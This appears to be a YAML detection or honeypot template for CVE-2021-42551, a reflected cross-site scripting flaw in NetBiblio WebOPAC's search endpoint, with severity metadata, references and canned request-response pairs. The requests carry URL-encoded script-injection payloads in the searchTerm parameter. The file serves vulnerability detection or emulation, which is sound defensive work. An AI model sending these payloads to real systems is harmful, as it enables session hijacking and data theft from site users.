id: CVE-2021-42551
info:
  name: NetBiblio WebOPAC - Cross-Site Scripting
  author: compr00t
  description: NetBiblio WebOPAC before 4.0.0.320 is affected by a reflected cross-site
    scripting vulnerability in its Wikipedia module through /NetBiblio/search/shortview
    via the searchTerm parameter.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42551
  - https://www.redguard.ch/advisories/netbiblio_webopac.txt
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-42551
    cwe-id: CWE-79
    epss-score: 0.00124
    epss-percentile: 0.46641
    cpe: cpe:2.3:a:alcoda:netbiblio:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: alcoda
    product: netbiblio
  tags: cve2021,cve,xss,netbiblio,alcoda
traps:
- request:
    method: GET
    path: /NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: 'SearchTerm: ''x''+alert(1)+''x'',SearchTerm: ''x\''+alert(1),//'',NetBiblio'
- request:
    method: GET
    path: /NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%5C%27%2Balert%281%29%2C%2F%2F
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
